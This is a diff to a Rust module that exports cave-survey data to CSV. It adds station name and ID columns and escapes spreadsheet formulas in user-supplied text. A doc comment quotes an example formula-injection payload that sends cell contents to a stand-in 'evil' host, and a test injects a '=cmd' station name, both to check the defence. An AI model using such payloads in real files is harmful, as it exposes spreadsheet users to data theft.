@@ -3,7 +3,7 @@ use std::io::Write;
 use std::path::Path;
 
 use super::atomic_write::write_atomic;
-use crate::models::Project;
+use crate::models::{Project, StationRef};
 
 /// Export project data to CSV format
 pub fn export_csv(project: &Project, path: &Path) -> Result<()> {
@@ -12,24 +12,48 @@ pub fn export_csv(project: &Project, path: &Path) -> Result<()> {
     Ok(())
 }
 
+/// The CSV header. A shot is identified the way the user reads it: its line
+/// by name and its two stations by name (`from`, `to`) and by Station ID
+/// (`from_id`, `to_id`); the internal line and shot ids are not written.
+pub const CSV_HEADER: &str = "line,from,to,from_id,to_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment";
+
+/// A line's station names and Station IDs, by station index (empty text for
+/// a station a normalization has not reached).
+pub(crate) fn station_columns(project: &Project, line_id: u32) -> Vec<(String, String)> {
+    project
+        .line_station_names(line_id)
+        .into_iter()
+        .enumerate()
+        .map(|(index, name)| {
+            let id = project
+                .station_id_at(StationRef::new(line_id, index as u32))
+                .map(|id| id.to_string())
+                .unwrap_or_default();
+            (name.unwrap_or_default(), id)
+        })
+        .collect()
+}
+
 fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
-    // Write header
-    writeln!(
-        file,
-        "section_id,section_name,shot_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment"
-    )?;
+    writeln!(file, "{CSV_HEADER}")?;
 
     // Write shots
-    for section in &project.sections {
-        let section_name = section.name.as_deref().unwrap_or("");
+    for line in &project.lines {
+        let line_name = line.name.as_deref().unwrap_or("");
+        let stations = station_columns(project, line.id);
+        let station = |index: usize| stations.get(index).cloned().unwrap_or_default();
 
-        for shot in &section.shots {
+        for (index, shot) in line.shots.iter().enumerate() {
+            let (from, from_id) = station(index);
+            let (to, to_id) = station(index + 1);
             writeln!(
                 file,
-                "{},{},{},{:.2},{:.1},{:.1},{:.2},{:.2},{},{},{},{},{},{}",
-                section.id,
-                escape_csv(section_name),
-                shot.id,
+                "{},{},{},{},{},{:.2},{:.1},{:.1},{:.2},{:.2},{},{},{},{},{},{}",
+                escape_csv(line_name),
+                escape_csv(&from),
+                escape_csv(&to),
+                from_id,
+                to_id,
                 shot.length,
                 shot.azimuth_in,
                 shot.azimuth_out,
@@ -58,7 +82,7 @@ fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
 /// 2. **Formula neutralisation.** Excel, LibreOffice and Sheets evaluate a cell
 ///    whose text begins with `=`, `+`, `-`, `@`, tab or CR - quoting does NOT
 ///    stop this, the formula is parsed after the CSV layer is stripped. The two
-///    fields that reach here (`section_name`, `shot.comment`) are attacker
+///    fields that reach here (`line_name`, `shot.comment`) are attacker
 ///    controlled: they come verbatim out of an imported `.tml` / `.dat` /
 ///    `.srv`, so a comment of `=HYPERLINK("http://evil/"&A1,"ok")` would run on
 ///    open. A leading apostrophe is the standard mitigation (OWASP).
@@ -66,6 +90,8 @@ fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
 /// The `-` case is deliberately included even though it costs a cosmetic
 /// apostrophe on a legitimate comment like `-2m to the floor`: `-1+1` is a
 /// formula too, and there is no way to tell the two apart without guessing.
+/// The station-name columns (`from`, `to`) go through it as well: a name is
+/// user text, and an imported one is file-controlled.
 fn escape_csv(s: &str) -> String {
     // Order matters: neutralise first, then quote, so the apostrophe is inside
     // the quotes rather than stranded outside them.
@@ -90,13 +116,13 @@ fn format_optional(value: Option<f64>) -> String {
 #[expect(clippy::unwrap_used)]
 mod tests {
     use super::*;
-    use crate::models::{SectionData, ShotData};
+    use crate::models::{LineData, ShotData};
     use tempfile::NamedTempFile;
 
     #[test]
     fn test_export_csv() {
         let mut project = Project::new("Test".to_string(), None);
-        project.add_section(SectionData {
+        project.add_line(LineData {
             name: Some("Main".to_string()),
             surveyor: None,
             date: None,
@@ -118,7 +144,7 @@ mod tests {
         assert!(result.is_ok());
 
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        assert!(contents.contains("section_id,section_name"));
+        assert!(contents.starts_with(CSV_HEADER));
         assert!(contents.contains("Main"));
         assert!(contents.contains("10.00"));
     }
@@ -134,7 +160,7 @@ mod tests {
 
     #[test]
     fn test_escape_csv_neutralises_spreadsheet_formulas() {
-        // A comment or section name comes verbatim out of an imported survey
+        // A comment or line name comes verbatim out of an imported survey
         // file, so it is attacker-controlled. Quoting alone does NOT stop a
         // formula - Excel parses the cell text after the CSV layer is stripped.
         assert_eq!(
@@ -214,15 +240,15 @@ mod tests {
         assert!(result.is_ok(), "empty project CSV export should succeed");
         let contents = std::fs::read_to_string(file.path()).unwrap();
         // Should have header row but no data rows
-        assert!(contents.contains("section_id,section_name"));
-        let lines: Vec<&str> = contents.lines().collect();
-        assert_eq!(lines.len(), 1, "only header row expected for empty project");
+        assert!(contents.starts_with(CSV_HEADER));
+        let rows: Vec<&str> = contents.lines().collect();
+        assert_eq!(rows.len(), 1, "only header row expected for empty project");
     }
 
     #[test]
-    fn test_export_csv_unicode_section_name() {
+    fn test_export_csv_unicode_line_name() {
         let mut project = Project::new("Unicode".to_string(), None);
-        project.add_section(SectionData {
+        project.add_line(LineData {
             name: Some("Grotte de l'Ours 🐻".to_string()),
             surveyor: Some("José García".to_string()),
             date: None,
@@ -243,10 +269,10 @@ mod tests {
         let result = export_csv(&project, file.path());
         assert!(result.is_ok());
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        // CSV only exports section_name, not surveyor - verify Unicode section name
+        // CSV only exports line_name, not surveyor - verify Unicode line name
         assert!(
             contents.contains("Grotte de l'Ours"),
-            "Unicode section name should be in CSV"
+            "Unicode line name should be in CSV"
         );
     }
 
@@ -256,10 +282,10 @@ mod tests {
     }
 
     #[test]
-    fn test_export_csv_multiple_sections() {
+    fn test_export_csv_multiple_lines() {
         let mut project = Project::new("Multi".to_string(), None);
         for i in 0..3 {
-            project.add_section(SectionData {
+            project.add_line(LineData {
                 name: Some(format!("Sec{i}")),
                 color: "#ff0000".to_string(),
                 shots: vec![ShotData {
@@ -278,7 +304,33 @@ mod tests {
         let result = export_csv(&project, file.path());
         assert!(result.is_ok());
         let contents = std::fs::read_to_string(file.path()).unwrap();
-        let data_lines = contents.lines().skip(1).count();
-        assert_eq!(data_lines, 3, "should have one row per shot");
+        let data_rows = contents.lines().skip(1).count();
+        assert_eq!(data_rows, 3, "should have one row per shot");
+    }
+
+    /// A row names the shot the way the user reads it: line name, station
+    /// names, Station IDs - and escapes a hostile station name like any text.
+    #[test]
+    fn rows_carry_station_names_and_ids() {
+        let mut project = Project::new("Ids".to_string(), None);
+        let line = project
+            .add_line(LineData {
+                name: Some("Main".to_string()),
+                color: "#ff0000".to_string(),
+                shots: vec![ShotData::default(), ShotData::default()],
+                ..Default::default()
+            })
+            .id;
+        project.ensure_station_identities();
+        project
+            .set_station_name(StationRef::new(line, 1), "=cmd")
+            .unwrap();
+        let mut out = Vec::new();
+        write_csv(&project, &mut out).unwrap();
+        let text = String::from_utf8(out).unwrap();
+        let rows: Vec<&str> = text.lines().collect();
+        assert_eq!(rows[0], CSV_HEADER);
+        assert!(rows[1].starts_with("Main,0,'=cmd,0,1,"), "{}", rows[1]);
+        assert!(rows[2].starts_with("Main,'=cmd,2,1,2,"), "{}", rows[2]);
     }
 }
